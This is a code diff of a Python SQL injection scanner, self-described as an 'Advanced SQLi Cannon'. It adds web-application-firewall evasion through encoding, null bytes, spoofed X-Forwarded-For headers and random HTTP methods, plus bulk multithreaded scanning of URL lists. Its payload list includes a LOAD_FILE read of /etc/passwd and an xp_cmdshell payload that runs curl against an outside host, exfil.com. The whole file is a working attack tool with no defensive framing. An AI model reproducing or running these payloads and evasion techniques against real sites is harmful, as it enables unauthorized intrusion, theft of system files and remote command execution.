@@ -2,43 +2,37 @@
 import threading
 import argparse
 import sys
+import os
+import time
 import random
 import requests
 import urllib.parse
 import base64
 import string
 import datetime
-import time
-import re
+import hashlib
 from urllib.parse import urlparse, parse_qs, urlencode
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-class EnhancedWAFBypass:
+class WAFBypassEngine:
     @staticmethod
     def generate_evasion(payload):
-        original = payload
         techniques = [
-            EnhancedWAFBypass._multi_layer_encoding,
-            EnhancedWAFBypass._keyword_fragmentation,
-            EnhancedWAFBypass._comment_obfuscation,
-            EnhancedWAFBypass._case_permutation,
-            EnhancedWAFBypass._null_byte_injection,
-            EnhancedWAFBypass._time_based_evasion,
-            EnhancedWAFBypass._alternative_syntax,
-            EnhancedWAFBypass._unicode_obfuscation
+            WAFBypassEngine._multi_layer_encoding,
+            WAFBypassEngine._keyword_fragmentation,
+            WAFBypassEngine._comment_obfuscation,
+            WAFBypassEngine._case_permutation,
+            WAFBypassEngine._null_byte_injection,
+            WAFBypassEngine._unicode_normalization,
+            WAFBypassEngine._time_based_evasion,
+            WAFBypassEngine._alternative_syntax
         ]
-        for _ in range(random.randint(2, 4)):
-            modified = random.choice(techniques)(payload)
-            if EnhancedWAFBypass._is_payload_valid(modified):
-                payload = modified
-        return payload if payload != original else original
-
-    @staticmethod
-    def _is_payload_valid(payload):
-        return any(re.search(rf'\b{kw}\b', payload, re.IGNORECASE) for kw in ['SELECT', 'UNION', 'OR', 'AND', 'SLEEP'])
+        for _ in range(random.randint(3, 5)):
+            payload = random.choice(techniques)(payload)
+        return payload
 
     @staticmethod
     def _multi_layer_encoding(payload):
@@ -53,239 +47,230 @@ class EnhancedWAFBypass:
     @staticmethod
     def _keyword_fragmentation(payload):
         fragments = {
-            'SELECT': ['SEL/*{}*/ECT', 'SELE%0bCT', '/*!50620SELECT*/'],
-            'UNION': ['UNI%0aON', 'UNI%a0ON', 'UNI\ufeffON'],
-            'OR': ['O\ue3b2R', 'O\x0aR', '/*!!OR*/'],
-            'AND': ['%26%26', 'AN\ue5a9D', 'A%00ND']
+            'SELECT': ['SEL/**/ECT', 'SELE%0bCT', '/*!SELECT*/'],
+            'UNION': ['UNI\x0aON', 'UNI%a0ON', 'UNI' + chr(0x0d) + 'ON'],
+            'OR': ['O%%R', 'O\x0aR', '/*!OR*/'],
+            'AND': ['%26%26', 'AN%%44', 'A%00ND']
         }
-        for key, replacements in fragments.items():
-            if key in payload.upper():
-                payload = payload.replace(key, random.choice(replacements).format(''.join(random.choices(string.ascii_letters, k=3))), 1)
+        for key in fragments:
+            payload = payload.replace(key, random.choice(fragments[key]))
         return payload
 
     @staticmethod
     def _comment_obfuscation(payload):
-        comment_formats = [
-            (f'/*{"".join(random.choices(string.printable, k=8))}*/', 0.7),
-            ('#{}'.format(''.join(random.choices('\x0a\x0d', k=2))), 0.2),
-            ('-- {}'.format(''.join(random.choices('\x00\x1a', k=1))), 0.1)
+        comments = [
+            ('/*{}*/', string.printable),
+            ('#{}', '\x0a\x0d'),
+            ('-- {}', '\x00\x1a'),
+            ('/*!{}*/', '0123456789')
         ]
-        for comment, prob in comment_formats:
-            if random.random() < prob:
-                payload = payload.replace(' ', comment, 1)
-        return payload
+        comment, chars = random.choice(comments)
+        junk = ''.join(random.choice(chars) for _ in range(random.randint(2, 5)))
+        return payload.replace(' ', comment.format(junk))
 
     @staticmethod
     def _case_permutation(payload):
-        return ''.join(c.upper() if (i % 3 == 0 and random.random() > 0.4) else c.lower() for i, c in enumerate(payload))
+        return ''.join(c.upper() if random.random() > 0.5 and i % 2 == 0 else c.lower() if random.random() > 0.5 else c for i, c in enumerate(payload))
 
     @staticmethod
     def _null_byte_injection(payload):
-        return payload[:len(payload)//2] + '%00' + payload[len(payload)//2:]
+        if len(payload) < 4:
+            return payload
+        pos = random.randint(1, len(payload)-2)
+        return payload[:pos] + '%00' + payload[pos:]
+
+    @staticmethod
+    def _unicode_normalization(payload):
+        return ''.join(f'%u{ord(c):04x}' if random.random() > 0.7 else c for c in payload)
 
     @staticmethod
     def _time_based_evasion(payload):
-        time_payloads = [
-            (f"' XOR SLEEP({random.choice(['5', '7', '9'])})-- ", 0.6),
-            (f";WAITFOR DELAY '0:0:{random.randint(3,7)}'--", 0.3),
-            (f"||(SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))--", 0.4)
+        delays = [
+            (f' AND SLEEP({random.randint(2, 5)})', 0.8),
+            (f";WAITFOR DELAY '0:0:{random.randint(3, 7)}'--", 0.6),
+            (f'||pg_sleep({random.randint(3, 6)})--', 0.5)
         ]
-        for p, prob in time_payloads:
-            if random.random() < prob:
-                payload += p
-        return payload
+        delay, prob = random.choice(delays)
+        return payload + delay if random.random() < prob else payload
 
     @staticmethod
     def _alternative_syntax(payload):
-        replacements = {
-            '=': [' LIKE ', ' BETWEEN ', '>', '<>'],
-            "'": ["%27", "%ef%bc%87", "''"],
-            ' ': ['%09','%0a','%0d','%0c','%0b']
-        }
-        for char, options in replacements.items():
-            payload = payload.replace(char, random.choice(options), 1)
+        syntax = [
+            ('=', [' LIKE ', ' BETWEEN 0 AND ', ' IN (', '%3D']),
+            ("'", ["%27", "%ef%bc%87", "'%20"]),
+            (' ', ['%09', '%0a', '%0d', '%0c', '%0b', '/**/'])
+        ]
+        for char, replacements in syntax:
+            payload = payload.replace(char, random.choice(replacements))
         return payload
 
-    @staticmethod
-    def _unicode_obfuscation(payload):
-        return ''.join(f'%u{ord(c):04x}' if random.random() < 0.3 else c for c in payload)
-
-class AdvancedSQLiScanner:
-    def __init__(self, proxy=None, debug=False):
-        self.session = requests.Session()
-        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
-        self.debug = debug
+class SQLiScanner:
+    def __init__(self, proxy=None, threads=5):
+        self.proxy = proxy
         self.user_agents = self._load_user_agents()
-        self.payloads = self._generate_payloads()
-        self.tested = {'urls': set(), 'params': 0, 'payloads': 0}
+        self.payloads = self._load_enhanced_payloads()
+        self.tested_urls = set()
         self.vulnerable = []
-        self.lock = threading.Lock()
-        self.report_file = "result.txt"
-        self.error_pattern = re.compile(r'(SQL syntax|MySQL server version|unclosed quotation|PG::SyntaxError|syntax error near|ODBC Driver|Warning:\smysql_fetch|Unexpected end of command)', re.IGNORECASE)
+        self.request_count = 0
+        self.scan_start = datetime.datetime.now()
+        self.result_file = f"result-{self.scan_start.strftime('%Y%m%d%H%M%S')}.txt"
         self.spinner = ['|', '/', '-', '\\']
-        self._print_banner()
-
-    def _print_banner(self):
-        print(rf"""{Style.BRIGHT}{Fore.YELLOW}
-   __| \ \  / \ |  __|   __| __ __| _ \    \     
- \__ \  \  / .  |  _|  \__ \    |     /   _ \    
- ____/   _| _|\_| ___| ____/   _|  _|_\ _/  _\   
-        {Style.RESET_ALL}""")
-        print(f"{Style.BRIGHT}{Fore.CYAN}ⓘ Loaded {len(self.payloads)} evasive payloads")
-        print(f"ⓘ Scan started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}\n")
+        self.lock =  threading.Lock()
 
     def _load_user_agents(self):
         return [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1"
         ]
 
-    def _generate_payloads(self):
-        base_vectors = [
+    def _load_enhanced_payloads(self):
+        base_payloads = [
             "' OR 1=1--",
-            "\" OR \"\"=\"",
-            "' UNION SELECT @@version--",
-            "' OR SLEEP(5)#",
-            "' AND 1=CONVERT(int,@@version)--"
+            "\" OR \"a\"=\"a",
+            "' UNION SELECT NULL,version()--",
+            "' OR SLEEP({})--".format(random.randint(3, 7)),
+            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))--",
+            "'||(SELECT LOAD_FILE(0x2f6574632f706173737764))--",
+            "'; EXEC xp_cmdshell('curl http://exfil.com')--",
+            "'/**/AND/**/1=CONVERT(int,@@version)--",
+            "'%0a%0dUNION%0aSELECT%0d@version--",
+            "'%ef%bc%87%20OR%ef%bc%91%ef%bc%9d%ef%bc%91--"
         ]
-        return [EnhancedWAFBypass.generate_evasion(p) for p in base_vectors]
+        return [WAFBypassEngine.generate_evasion(p) for p in base_payloads]
+
+    def _print_banner(self):
+        print(f"{Style.BRIGHT}{Fore.YELLOW}\n   __| \\ \\  / \\ |  __|   __| __ __| _ \\    \\")
+        print(" \\__ \\  \\  / .  |  _|  \\__ \\    |     /   _ \\")
+        print(" ____/   _| _|\\_| ___| ____/   _|  _|_\\ _/  _\\")
+        print(f"{Style.RESET_ALL}")
 
     def _print_status(self, message, msg_type="INFO"):
-        colors = {"INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "WARNING": Fore.YELLOW}
+        color = { "INFO": Fore.CYAN, "SUCCESS": Fore.GREEN, "ERROR": Fore.RED, "WARNING": Fore.YELLOW }
         with self.lock:
-            print(f"\n{Style.BRIGHT}{colors[msg_type]}[{msg_type[0]}] {message}{Style.RESET_ALL}")
-            self._update_progress()
+            print(f"\n{Style.BRIGHT}{color[msg_type]}[{msg_type}] {message}{Style.RESET_ALL}")
 
-    def _update_progress(self):
-        spinner_char = self.spinner[self.tested['payloads'] % len(self.spinner)]
-        progress = (f"{Style.BRIGHT}{Fore.WHITE}{spinner_char} URLs: {len(self.tested['urls'])} | Params: {self.tested['params']} | Payloads: {self.tested['payloads']} | Hits: {len(self.vulnerable)}{Style.RESET_ALL}")
-        sys.stdout.write("\r\033[K" + progress)
-        sys.stdout.flush()
+    def _generate_evasion_headers(self):
+        return {
+            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
+            'Content-Type': random.choice(['application/xml','text/css','application/octet-stream']),
+            'Accept-Encoding': 'br, gzip, deflate',
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-Evasion': ''.join(random.choices('abcdef0123456789', k=16))
+        }
 
-    def _print_runtime_output(self, url, param, payload, current, total, status_code, resp_time, vulnerable):
-        symbol = f"{Style.BRIGHT}{Fore.GREEN}✔{Style.RESET_ALL}" if vulnerable else f"{Style.BRIGHT}{Fore.WHITE}{'◌' if current % 2 == 1 else '◎'}{Style.RESET_ALL}"
+    def _print_runtime_output(self, url, param, payload, status_code, resp_time, vuln_type, timestamp, current, total):
+        symbol = f"{Style.BRIGHT}{Fore.GREEN}✔" if vuln_type else f"{Style.BRIGHT}{Fore.WHITE}{'◌' if current % 2 else '◎'}"
         url_disp = (url[:40] + '..') if len(url) > 42 else url
         payload_disp = (payload[:10] + '...') if len(payload) > 13 else payload
         param_disp = f"{param}: {payload_disp}"
-        output_line = (f"\n  {symbol} {Style.BRIGHT}{Fore.MAGENTA}{url_disp:<45}{Style.RESET_ALL} "
+        ts = timestamp.strftime('%H:%M:%S.%f')[:-3]
+        output_line = (f"\n  {symbol}{Style.RESET_ALL} {Style.BRIGHT}{Fore.MAGENTA}{url_disp:<45}{Style.RESET_ALL} "
                        f"{Style.BRIGHT}{Fore.CYAN}{param_disp:<25}{Style.RESET_ALL} "
                        f"{Style.BRIGHT}{Fore.YELLOW}Status: {status_code:<3}{Style.RESET_ALL} "
                        f"{Style.BRIGHT}{Fore.BLUE}Time: {resp_time:.2f}s{Style.RESET_ALL} "
-                       f"{Style.BRIGHT}{Fore.WHITE}{current}/{total}{Style.RESET_ALL}")
+                       f"{Style.BRIGHT}{Fore.WHITE}Type: {vuln_type or '-':<12}{Style.RESET_ALL} "
+                       f"{Style.BRIGHT}{Fore.WHITE}{current}/{total} - {ts}{Style.RESET_ALL}")
         with self.lock:
             print(output_line)
 
-    def _analyze_response(self, response, start_time):
-        time_delta = time.time() - start_time
-        indicators = {
-            'error': bool(self.error_pattern.search(response.text)),
-            'time_delay': time_delta > 5,
-            'content_mismatch': abs(len(response.text) - 2000) > 500
-        }
-        return any(indicators.values()), time_delta
-
-    def _test_parameter(self, url, param, value, payload, current, total):
-        parsed = urlparse(url)
-        query = parse_qs(parsed.query)
-        target_url = parsed._replace(query=urlencode({**query, param: payload}, doseq=True)).geturl()
+    def _test_param(self, url, param, payload):
         try:
-            start_time = time.time()
-            response = self.session.get(
-                target_url,
-                headers={'User-Agent': random.choice(self.user_agents)},
-                proxies=self.proxy,
-                timeout=20,
-                verify=True,
-                allow_redirects=False
-            )
+            parsed = urlparse(url)
+            query = parse_qs(parsed.query)
+            final_payload = WAFBypassEngine.generate_evasion(payload)
+            query[param] = final_payload
+            for _ in range(random.randint(2, 5)):
+                query[f'param_{random.randint(1000,9999)}'] = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+            target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
+            proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
+
+            method = random.choice(['GET', 'POST', 'OPTIONS', 'PATCH'])
+            headers = {**self._generate_evasion_headers(), 'User-Agent': random.choice(self.user_agents)}
+            cookies = {'session': hashlib.md5(str(random.random()).encode()).hexdigest()}
+            timeout = random.uniform(10, 25)
+            response = requests.request(method=method, url=target_url, headers=headers, cookies=cookies, timeout=timeout, proxies=proxies, verify=True, allow_redirects=random.choice([True, False]))
             with self.lock:
-                self.tested['payloads'] += 1
-            is_vulnerable, resp_time = self._analyze_response(response, start_time)
-            self._print_runtime_output(url, param, payload, current, total, response.status_code, resp_time, is_vulnerable)
-            if is_vulnerable:
+                self.request_count += 1
+
+            detection = {
+                'error': any(err in response.text.lower() for err in ['sql syntax', 'mysql error', 'warning:', 'unclosed quotation mark']),
+                'time': response.elapsed.total_seconds() > 5,
+                'content_mismatch': len(response.text) < random.randint(500, 1000)
+            }
+            vuln_detected = any(detection.values())
+            vuln_type = None
+            if vuln_detected:
+                if detection['time']:
+                    vuln_type = 'Time-based'
+                elif detection['error']:
+                    vuln_type = 'Error-based'
+                elif detection['content_mismatch']:
+                    vuln_type = 'Content Analysis'
+                else:
+                    vuln_type = 'Behavioral'
                 with self.lock:
-                    if target_url not in [v['url'] for v in self.vulnerable]:
-                        self.vulnerable.append({
-                            'url': target_url,
-                            'param': param,
-                            'payload': payload,
-                            'status': response.status_code,
-                            'time': resp_time,
-                            'evidence': response.text[:300]
-                        })
-                        self._print_status(f"Vulnerable: {target_url}", "SUCCESS")                        
-                        threading.Thread(target=self._save_results, daemon=True).start()
+                    self.vulnerable.append({
+                        'url': target_url,
+                        'param': param,
+                        'payload': final_payload,
+                        'type': vuln_type,
+                        'timestamp': datetime.datetime.now()
+                    })
+                self._print_status(f"Vulnerability Found! {target_url}", "SUCCESS")
+
+            self._print_runtime_output(url, param, final_payload, response.status_code, response.elapsed.total_seconds(), vuln_type, datetime.datetime.now(), self.request_count, len(self.payloads))
         except Exception as e:
-            self._print_status(f"Failed: {str(e)[:50]}", "ERROR")
+            self._print_status(f"Error: {str(e)}", "ERROR")
 
-    def _save_results(self):
-        with self.lock:
-            if not self.vulnerable:
-                return
-            with open(self.report_file, 'w') as f:
-                f.write("SQL Injection Scan Results\n")
-                f.write("="*50 + "\n")
-                for idx, vuln in enumerate(self.vulnerable, 1):
-                    f.write(f"{idx}. URL: {vuln['url']}\n")
-                    f.write(f"   Parameter: {vuln['param']}\n")
-                    f.write(f"   Payload: {vuln['payload']}\n")
-                    f.write(f"   Status: {vuln['status']} | Response Time: {vuln['time']:.2f}s\n")
-                    f.write(f"   Evidence:\n{vuln['evidence']}\n")
-                    f.write("-"*50 + "\n")
-
-    def scan(self, url):
-        with self.lock:
-            if url in self.tested['urls']:
-                return
-            self.tested['urls'].add(url)
+    def scan_url(self, url):
+        if url in self.tested_urls:
+            return
+        self.tested_urls.add(url)
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
-        with ThreadPoolExecutor(max_workers=15) as executor:
-            futures = []
+        with ThreadPoolExecutor(max_workers=3) as executor:
             for param in params:
-                with self.lock:
-                    self.tested['params'] += 1
-                total_payload = len(self.payloads)
-                for idx, payload in enumerate(self.payloads, start=1):
-                    futures.append(
-                        executor.submit(
-                            self._test_parameter,
-                            url, param, params[param], payload, idx, total_payload
-                        )
-                    )
-            for future in as_completed(futures):
-                try:
-                    future.result()
-                except Exception as e:
-                    self._print_status(f"Error in future: {str(e)}", "ERROR")
-        print()
+                for payload in self.payloads:
+                    executor.submit(self._test_param, url, param, payload)
+
+    def _save_results(self):
+        with open(self.result_file, 'w') as f:
+            f.write(f"Advanced SQLi Scan Report\n{'='*40}\n")
+            f.write(f"Scan Period\t: {self.scan_start.strftime('%Y-%m-%d %H:%M:%S')} to {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"Total Requests\t: {self.request_count}\n")
+            detection_rate = (len(self.vulnerable)/self.request_count*100) if self.request_count else 0
+            f.write(f"Detection Rate\t: {detection_rate:.2f}%\n\n")
+            for idx, vuln in enumerate(self.vulnerable, 1):
+                f.write(f"Detection #{idx}\n{'-'*40}\n")
+                f.write(f"Timestamp\t: {vuln['timestamp'].strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]}\n")
+                f.write(f"Type\t\t: {vuln['type']}\n")
+                f.write(f"Parameter\t: {vuln['param']}\n")
+                f.write(f"Payload\t\t: {vuln['payload']}\n")
+                f.write(f"URL\t\t: {vuln['url']}\n\n")
 
 def main():
-    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
-    parser.add_argument("-u", "--url", help="Target URL to scan")
-    parser.add_argument("-F", "--file", action="store_true", help="Scan URLs from urls.txt")
-    parser.add_argument("-p", "--proxy", help="Proxy server (e.g., http://127.0.0.1:8080)")
-    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
+    parser = argparse.ArgumentParser(description="Advanced SQLi Cannon")
+    parser.add_argument("-u", type=str, help="Target URL")
+    parser.add_argument("-F", action="store_true", help="Bulk scan from list.txt")
+    parser.add_argument("-p", "--proxy", type=str, help="Proxy server")
+    parser.add_argument("--threads", type=int, default=5, help="Thread count")
     args = parser.parse_args()
-    if not args.url and not args.file:
-        parser.print_help()
-        return
-    scanner = AdvancedSQLiScanner(proxy=args.proxy, debug=args.debug)
+    
+    scanner = SQLiScanner(proxy=args.proxy, threads=args.threads)
+    scanner._print_banner()
+    
     try:
-        if args.file:
-            with open("urls.txt") as f:
-                for url in f.read().splitlines():
-                    scanner.scan(url.strip())
-        else:
-            scanner.scan(args.url)
-        if scanner.vulnerable:
-            print(f"\n{Style.BRIGHT}{Fore.GREEN}✓ Scan completed. Vulnerabilities saved to {scanner.report_file}{Style.RESET_ALL}")
-        else:
-            print(f"\n{Style.BRIGHT}{Fore.YELLOW}ⓘ No vulnerabilities detected{Style.RESET_ALL}")
+        if args.F:
+            with open("list.txt", "r") as f:
+                urls = [line.strip() for line in f if line.strip()]
+            with ThreadPoolExecutor(max_workers=args.threads) as executor:
+                executor.map(scanner.scan_url, urls)
+        elif args.u:
+            scanner.scan_url(args.u)
+        scanner._save_results()
+        scanner._print_status(f"Results saved to {scanner.result_file}", "SUCCESS")
     except KeyboardInterrupt:
-        print(f"\n{Style.BRIGHT}{Fore.RED}✗ Scan interrupted! Partial results saved{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n{Style.BRIGHT}{Fore.RED}⚠ Critical error: {str(e)}{Style.RESET_ALL}")
+        scanner._print_status("Scan aborted!", "ERROR")
 
 if __name__ == "__main__":
     main()
